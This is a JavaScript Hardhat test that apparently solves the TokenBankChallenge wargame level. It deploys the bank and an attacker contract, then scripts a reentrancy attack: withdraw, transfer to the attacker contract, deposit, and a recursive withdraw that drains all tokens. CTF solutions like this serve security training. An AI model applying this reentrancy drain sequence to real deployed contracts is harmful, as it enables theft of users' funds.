const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('TokenBankChallenge', function () {
  it('should exploit the bank and drain all tokens', async function () {
    // Deploy the TokenBankChallenge and Token contracts
    const [deployer, attacker] = await ethers.getSigners();
    const TokenBankChallenge = await ethers.getContractFactory('TokenBankChallenge', deployer);
    const bank = await TokenBankChallenge.deploy(attacker.address);
    await bank.deployed();
    const tokenAddress = await bank.token();
    const SimpleERC223Token = await ethers.getContractFactory('SimpleERC223Token', deployer);
    const token = SimpleERC223Token.attach(tokenAddress);

    // Deploy the TokenBankAttacker contract
    const TokenBankAttacker = await ethers.getContractFactory('TokenBankAttacker', attacker);
    const attackerContract = await TokenBankAttacker.deploy(bank.address, token.address);
    await attackerContract.deployed();

    // Attack sequence
    // Step 1: Attacker withdraws their share of tokens
    await bank.connect(attacker).withdraw((await bank.balanceOf(attacker.address)).toString());

    // Step 2: Transfer all attacker's tokens to the Attacker contract
    await token
      .connect(attacker)
      ['transfer(address,uint256)'](
        attackerContract.address,
        (await token.balanceOf(attacker.address)).toString()
      );

    // Step 3: Attacker contract deposits tokens into the bank
    await attackerContract.connect(attacker).deposit();

    // Step 4: Attacker contract initiates the recursive withdraw
    await attackerContract.connect(attacker).withdraw();

    // Check if the bank has no tokens left, which means the attack was successful
    expect(await token.balanceOf(bank.address)).to.equal(0);
    expect(await bank.isComplete()).to.be.true;
  });
});
